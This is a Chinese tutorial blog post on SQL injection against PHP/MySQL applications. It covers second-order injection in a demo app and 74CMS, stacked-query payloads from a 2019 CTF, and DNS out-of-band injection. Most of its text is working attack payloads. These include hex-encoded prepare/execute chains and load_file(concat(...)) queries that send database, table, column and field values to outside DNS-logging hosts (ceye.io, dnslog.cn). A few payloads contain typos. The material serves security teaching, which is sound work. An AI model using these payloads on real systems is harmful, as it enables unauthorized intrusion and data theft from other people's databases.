---
title: PHP应用&SQL二次注入&堆叠执行&DNS带外&功能点&黑白盒条件
published: 2025-11-14
description: 二次注入、堆叠注入条件及案例，NDS带外注入。
tags: [PHP,WEB攻防,SQL注入]
category: 网络安全
draft: false
---

# PHP应用&SQL二次注入&堆叠执行&DNS带外&功能点&黑白盒条件

## 知识点

> 1. PHP-MYSQL-SQL注入-二次注入&利用条件
> 2. PHP-MYSQL-SQL注入-堆叠注入&利用条件
> 3. PHP-MYSQL-SQL注入-带外注入&利用条件

**以下漏洞在实战中是很难碰到的（黑盒条件苛刻，payload构造难度大）。**

## PHP-MYSQL-二次注入-DEMO&74CMS

> 黑盒思路：分析功能有添加后对数据操作的地方（功能点）几乎不可能，干扰因素太多
>
> 白盒思路：insert后进入select或update的功能的代码块（一般都通过这个方式挖出来）
>
> 1. DEMO-用户注册登录修改密码
> 2. CMS-74CMS个人中心简历功能
>
> 黑盒思路：分析功能有添加后对数据操作的地方（功能点）
>
> 白盒思路：insert后进入select或update的功能的代码块
>
> 注入条件：插入时有转义函数或配置，后续有利用插入的数据

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251114143205380.png" alt="image-20251114143205380" style="zoom: 67%;" />

必须要有转义，如果没有的话，当经过数据库时，就会出现攻击语句失效的情况。

![image-20251114151432541](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251114151432541.png)

比如进行注册时候(数据库执行视角)：

```sql
INSERT INTO users (username,password) VALUES ('这是用户名' and updatexml(1,concat(ex7e,(SELECT version()),0x7e),1)#'.'11111111')
```

如果没有转义的话，就会在数据库执行时候报错，因为此时只给了username的值，后续语句被屏蔽掉了，此时可以把赋值用户名后面的单引号删掉，也就是去掉此处的闭合就可以插入数据，但是插入成功的数据在进行后续二次注入肯定是失效的，这不是最终想要的结果。

### DEMO-用户注册登录修改密码

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/111401.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/5804ba079cbe458cb8e9bd9d3876dfad.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/53c7525a71b313a6c7ebd77302b55dda.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/fe4eaad5daba29b29ef0452fd17997d2.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3531a58cf24aabdc21179e959d271117.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/8027797493552ba0308bd48a5d675f35.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/5e24fa1e71456ef305bc6cddc919ce9e.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/31328740cb181b9b2cded97ed4880637.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/88f5e49fc87c7f81c44ff1b0b1ae8290.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/75fbe29394883e28a2d8582bcaf06e3b.png)

### CMS-74CMS个人中心简历功能

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/ddd48a2afe3a5a45517d720b7c707732.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/09cadd6d660b972b311fcc2c9763e671.png)

## PHP-MYSQL-堆叠注入-DEMO&CTF强网

### Demo

堆叠注入触发的条件很苛刻：因为堆叠注入原理就是通过结束符(;)同时执行多条sql语句，例如php中的mysqli_multi_query函数。与之相对应的mysqli_query()只能执行一条SQL。
所以要想目标存在堆叠注入,在目标代码中存在类似于mysqli_multi_query()这样的函数并且也要看目标数据库类型是否支持多语句执行。

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/1da7a938cb9fcb83fae70daf82dd4ae1.png)

![img](https://i-blog.csdnimg.cn/blog_migrate/1335ee271441adfcb5b0b63cc7696235.png)

在数据库中这样执行是没有问题的，但是如果在实战中，都是通过网站插入注入语句，那么这个时候就得看这个网站当前的脚本支不支持多语句查询，也就是有没有使用mysqli_multi_query函数(该函数支持多SQL语句查询)。

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/a7173772902a0d150ae8cf2a5a2e4dbc.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/5f2a22d436b4d9f3698be4c79cc26a75.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/d8bd53e5a1f93bb1400c9ae3c55f2938.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/1889868bb0a0a6519963e033f7b50f10.png)

产生条件：支持堆叠数据库：MYSQL MSSQL Postgresql等

1. 目标脚本代码中存在多语句执行函数(mysqli_multi_query)并对;号不过滤。
2. 目标数据库类型支不支持多SQL语句执行。

### 2019强网杯-随便注（CTF题型）

payload：

```sql
';show databases;
';show tables;
';show columns from 1919810931114514;
';select flag from 1919810931114514;
#转换为十六进制
';SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;
```

其他方法可参考利用 `HANDLER`语句攻击链文章：https://blog.csdn.net/2402_84408069/article/details/150040369

## PHP-MYSQL-带外注入-DEMO&DNSLOG(让服务器主动把数据交出去)

注入条件：

1. root高权限且支持load_file()函数(mysql有个secure-file-priv配置会限制load_file函数)。
2. windows系统（需要用到\号）为啥payload需要用到四个\\，就是因为数据库转义。

有部分注入点是没有回显的，所以读取也是没回显的，就得采用带外注入。

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/c8b7f3e401f722e4f8763a84547d9b51.png)

使用平台：http://ceye.io/

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/111402.png)

ping test.分配给的地址.ceye.io //test是随便改的，后面是固定的

![image-20251114161246308](C:\Users\pwn\AppData\Roaming\Typora\typora-user-images\image-20251114161246308.png)

ping %USERNAME%.分配地址.ceye.io //%USERNAME%获取本地计算机用户名的

![image-20251114161429238](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251114161429238.png)

#### 带外应用场景

解决不回显，反向连接，SQL注入，命令执行，SSRF等。

数据库里执行：

select load_file(concat(‘\\’,(select database()),‘.7logee.dnslog.cn\aa’)); //aa随便输入的

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/b827743fa226be64e2aa0d3eb96bab96.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/a08b59ec0e54b4d58096751a8fa61cd2.png)

SQL注入：

```sql
and (select load_file(concat('//',(select database()),'.69knl9.dnslog.cn/abc'))) //abc随便输入的
```

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/574d8d4eba64db2aed82992c555ea6c4.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/fe2918b874252be002bc2af58c7fc616.png)

```sql
// 查询当前数据库
id=1 and load_file(concat("\\\\",database(),".dbuh8a.ceye.io\\asdt"))
 
//查询其他数据库
id=1 and load_file(concat("\\\\",(select schema_name from information_schema.schemata limit 0,1),".dbuh8a.ceye.io\\xxx.txt"))
"""
由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数
limit 0,1 查询第一个数据库名
limit 1,1 查询第二个数据库名
limit 2,1 查询第三个数据库名
"""
 
//查询版本号
id=1 and load_file(concat("\\\\",version(),".dbuh8a.ceye.io\\xxx.txt"))
 
//查询当前数据库demo01中第一个表名
id=1 and load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='demo01' limit 0,1 ),".dbuh8a.ceye.io\\xxx.txt"))
 
"""
由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数
limit 0,1 查询第一个表名
limit 1,1 查询第二个表名
limit 2,1 查询第三个表名
"""
//查询security数据库emails表下第一个列名
id=1 and load_file(concat("\\\\",(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),".dbuh8a.ceye.io\\xxx.txt"))
 
//查询字段值  数据库名为security 表名emails 列名id
id=1 and load_file(concat("\\\\",(select id from security.emails limit 0,1),".dbuh8a.ceye.io\\xxx.txt"))
```

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/b4afbe7f6ea6c44d615694c608820fd7.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/5be506af4a3e9206e6990ae129ee1567.png)

由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数：

**limit 0,1 查询第一个表名**

**limit 1,1 查询第二个表名**

**limit 2,1 查询第三个表名**

```sql
id=1 and load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='demoe1' limit 1,1,".dbuh8a.ceye.io/sadsdsadsa"))
// 对其他的进行查询就对payload进行对应的修改即可
```

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/b6976e7662bb5d4d2c3af5b8e90a9113.png)
